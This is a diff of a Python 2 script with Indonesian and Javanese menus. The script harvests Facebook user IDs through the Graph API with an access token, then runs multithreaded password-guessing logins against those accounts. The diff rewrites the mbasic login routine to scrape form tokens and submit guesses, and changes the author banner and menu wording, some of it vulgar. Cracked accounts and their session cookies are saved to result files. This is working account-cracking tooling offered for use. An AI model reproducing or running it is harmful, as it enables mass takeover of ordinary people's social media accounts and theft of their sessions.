@@ -73,15 +73,43 @@ def folder():
 IP = requests.get('https://api.ipify.org').text
 def banner():
 	print (''' %s 
- © group%s
- 
-  ____            _           _ 
- | __ )  __ _  __| |_ __ ___ | |
- |  _ \ / _` |/ _` | '__/ _ \| |
- | |_) | (_| | (_| | | | (_) | |
- |____/ \__,_|\__,_|_|  \___/|_|
-                                
- %s[%s*%s] By : %sMAS FAJAR
+ © Group%s
+
+  ███████████████████████████████
+████╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬████
+██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
+█╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
+█╬╬╬███████╬╬╬╬╬╬╬╬╬███████╬╬╬█
+█╬╬██╬╬╬╬███╬╬╬╬╬╬╬███╬╬╬╬██╬╬█
+█╬██╬╬╬╬╬╬╬██╬╬╬╬╬██╬╬╬╬╬╬╬██╬█
+█╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
+█╬╬╬╬█████╬╬╬╬╬╬╬╬╬╬╬█████╬╬╬╬█
+█╬╬█████████╬╬╬╬╬╬╬█████████╬╬█
+█╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
+█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
+█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
+█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
+█╬╬╬▓▓▓▓╬╬╬╬╬╬╬█╬╬╬╬╬╬╬▓▓▓▓╬╬╬█
+█╬╬▓▓▓▓▓▓╬╬█╬╬╬█╬╬╬█╬╬▓▓▓▓▓▓╬╬█
+█╬╬╬▓▓▓▓╬╬██╬╬╬█╬╬╬██╬╬▓▓▓▓╬╬╬█
+█╬╬╬╬╬╬╬╬██╬╬╬╬█╬╬╬╬██╬╬╬╬╬╬╬╬█
+█╬╬╬╬╬████╬╬╬╬███╬╬╬╬████╬╬╬╬╬█
+█╬╬╬╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬╬╬╬█
+██╬╬█╬╬╬╬╬╬╬╬█████╬╬╬╬╬╬╬╬█╬╬██
+██╬╬██╬╬╬╬╬╬███████╬╬╬╬╬╬██╬╬██
+██╬╬▓███╬╬╬████╬████╬╬╬███▓╬╬██
+███╬╬▓▓███████╬╬╬███████▓▓╬╬███
+███╬╬╬╬▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬███
+████╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬████
+█████╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬█████
+██████╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬██████
+███████╬╬╬╬╬╬╬███╬╬╬╬╬╬╬███████
+████████╬╬╬╬╬╬███╬╬╬╬╬╬████████
+█████████╬╬╬╬╬███╬╬╬╬╬█████████
+███████████╬╬╬╬█╬╬╬╬███████████
+███████████████████████████████
+         \/    \/ 
+ %s[%s*%s] By : %sRiyandika Fajar S
  %s[%s*%s] --------------------------------------
  [%s*%s] IP : %s%s
 '''%(H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
@@ -145,19 +173,19 @@ def menu():
     except requests.exceptions.ConnectionError:
         exit("%s [!] Kesalahan koneksi "%(M))
     banner()
-    print (' %s[ selamat maling %s%s%s ] \n'%(P,K,nama,P))
-    print (' [%s01%s] Dump id public'%(K,P)) 
+    print (' %s[ riyan emang %s%s%s ] \n'%(P,K,nama,P))
+    print (' [%s01%s] Dump id publik'%(K,P)) 
     print (' [%s02%s] Dump id followers'%(K,P)) 
     print (' [%s03%s] Dump id reaction post'%(K,P)) 
-    print (' [%s04%s] %sStart maling %s'%(K,P,H,P)) 
-    print (' [%s05%s] Ganti user agent'%(K,P)) 
+    print (' [%s04%s] %sGas maling %s'%(K,P,H,P)) 
+    print (' [%s05%s] Ganti bojo'%(K,P)) 
     print (' [%s06%s] Cek hasil maling'%(K,P)) 
     #print (' [%s07%s] Gabung group'%(K,P))
     #print (' [%s08%s] Info script'%(K,P))
-    print (' [%s00%s] Metu (hapus token)'%(M,P))
+    print (' [%s00%s] Murtad (hapus token)'%(M,P))
     unik = raw_input('\n%s [?] Menu : %s'%(P,K))
     if unik == '':
-        print("%s [!] Isi seng genah cok "%(M));jeda(2);menu()
+        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
     elif unik in['1','01']:
         publik(romz)
     elif unik in['2','02']:
@@ -175,13 +203,13 @@ def menu():
             for file in dirs:
                 print("%s -> %s%s"%(K,P,file));jeda(0.2)
             print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
-            file = raw_input("%s [?] lebokno file : "%(P));jeda(0.2)
+            file = raw_input("%s [?] masukan file dump : "%(P));jeda(0.2)
             if file == "":
-                print("%s [!] file e renek "%(M))
+                print("%s [!] file tidak ada "%(M))
             total = open("hasil/%s"%(file)).read().splitlines()
             print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
             nm_file = ("%s"%(file)).replace("-", " ")
-            jalan(" [%s*%s] totale akun : %s"%(K,P,len(total)))
+            jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
             print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
             for akun in total:
             	fb = akun.replace("\n","")
@@ -210,7 +238,7 @@ def publik(romz,headers=header):
         os.mkdir('dump')
     except:pass
     try:
-    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
+    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump konco dewe "%(P,M,P,H,P))
         idt = raw_input(' [*] Target id : %s'%(K))
         gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
         nm = json.loads(gas.text)
@@ -225,12 +253,12 @@ def publik(romz,headers=header):
             sys.stdout.flush();jeda(0.0050)
 
         bff.close()
-        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
-        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
+        print ('\n\n %s[%s√%s] Sukses dump id dari %s%s'%(P,H,P,H,nm['name']))
+        print ('%s [%s√%s] File dump kesimpen :%s %s '%(P,H,P,H,file))
         raw_input('\n%s [ %senter %s] '%(P,K,P))
         menu()
     except Exception as e:
-        exit('\n %s[!] gagal ngedump '%(P))
+        exit('\n %s[!] gagal,jangan ngamok'%(P))
 
 # DUMP FOLLOWERS
 def followers(romz,headers=header):
@@ -298,13 +326,13 @@ class ngentod:
 
     def romiy(self):
         try:
-            self.apk = raw_input('\n %s[?] file dump mau :%s '%(P,K))
+            self.apk = raw_input('\n %s[?] file dump :%s '%(P,K))
             self.id = open(self.apk).read().splitlines()
             print '%s [%s*%s] jumlah id : %s%s' %(P,K,P,H,len(self.id))
         except:
-            print '\n%s [!] File dump renek, dump id disek baru dilebokne'%(M)
+            print '\n%s [!] File dump tidak ada, dump id dulu kentod'%(M)
             raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
-        unikers = raw_input('%s [?] pengen nanggo pasword manual? [y/t] :%s '%(P,K))
+        unikers = raw_input('%s [?] ingin gunakan password manual? [y/t] :%s '%(P,K))
         if unikers in ('Y', 'y'):
             print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
             while True:
@@ -338,7 +366,7 @@ class ngentod:
                                         log.submit(self.basic, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
-                        elif ind in ('2', '03'):
+                        elif ind in ('3', '03'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
@@ -349,7 +377,7 @@ class ngentod:
                                     except: pass
                             os.remove(self.apk);exit()
                         else:
-                            print '\n %s[!] isi yang benar kentod'%(M);self.zona()
+                            print ('\n %s[!] isi yang benar kentod'%(M));zona()
                     print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
                     print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
                     print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
@@ -360,7 +388,7 @@ class ngentod:
             print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
             print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
             print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-            print ' [%s03%s] methode mobile (crack sangat lambat) hasile okeh seng cp berkurang lan langsung tap yes'%(K,P)
+            print ' [%s03%s] methode mobile (crack sangat lambat) hasil banyak kemungkinan besar akun terkena checkpoint berkurang / one tab yes'%(K,P)
             self.langsung()
         else:
             print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
@@ -418,7 +446,7 @@ class ngentod:
                         pass
             os.remove(self.apk);exit()
         else:
-            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
+            print("\n%s [!] Isi yang benar kentod "%(M));self.langsung()
 
     def b_api(self, user, zona):
     	try:
@@ -483,7 +511,23 @@ class ngentod:
             ses = requests.Session()
             ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://mbasic.facebook.com")
-            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
+            b = bs4.BeautifulSoup(p.text, 'html.parser')
+            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
+            data = {}
+            for i in b('input'):
+            	if i.get('value') is None:
+            	    if i.get('name') == 'email':
+            	        data.update({"email":user})
+                    elif i.get("name")=="pass":
+                    	data.update({"pass":pw})
+                    else:
+                    	data.update({i.get('name'): ''})
+                else:
+                	data.update({i.get('name'): i.get('value')})
+            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
+            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
+            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
+            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
@@ -586,9 +630,9 @@ class ngentod:
         
 # GANTI USER AGENT
 def useragent():
-	print ("\n%s [%s01%s] Ganti bojo "%(P,K,P))
-	print (" [%s02%s] Cek bojo "%(K,P))
-	print (" [%s00%s] metu "%(M,P))
+	print ("\n%s [%s01%s] Ganti user agents "%(P,K,P))
+	print (" [%s02%s] Cek user agents "%(K,P))
+	print (" [%s00%s] Kembali "%(M,P))
 	uas()
 	
 def uas():
